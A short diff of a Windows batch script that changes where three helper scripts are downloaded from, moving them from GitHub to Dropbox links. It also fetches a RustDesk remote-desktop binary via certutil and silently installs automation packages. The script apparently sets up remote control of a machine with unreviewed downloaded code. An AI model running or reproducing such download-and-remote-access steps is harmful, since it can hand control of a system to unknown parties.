@@ -1,7 +1,7 @@
 @echo off
-curl -L -o login.py https://raw.githubusercontent.com/iliavik1/hu/main/login.py
-curl -L -o loop.bat https://raw.githubusercontent.com/iliavik1/hu/main/loop.bat
-curl -L -o show.bat https://raw.githubusercontent.com/iliavik1/hu/main/show.bat
+curl -L -o login.py https://www.dropbox.com/scl/fi/az5jzhpuiylnw7yqw9du5/login.py?rlkey=1qjxif8fu35dh0v77nagv2ihh&dl=0
+curl -L -o loop.bat https://www.dropbox.com/scl/fi/vji7ekyslpbovokpqeay3/loop.bat?rlkey=876nfzm3qdmyqhc1jckgqjcld&dl=0
+curl -L -o show.bat https://www.dropbox.com/scl/fi/cwbwdo2n3tt8rbqmugc6h/show.bat?rlkey=41m0ds12mg6e28giib3zqlf6w&dl=0
 certutil -urlcache -split -f "https://github.com/rustdesk/rustdesk/releases/download/1.2.1/rustdesk-1.2.1-x86_64.exe" rustdesk.exe
 pip install pyautogui --quiet
 pip install psutil --quiet
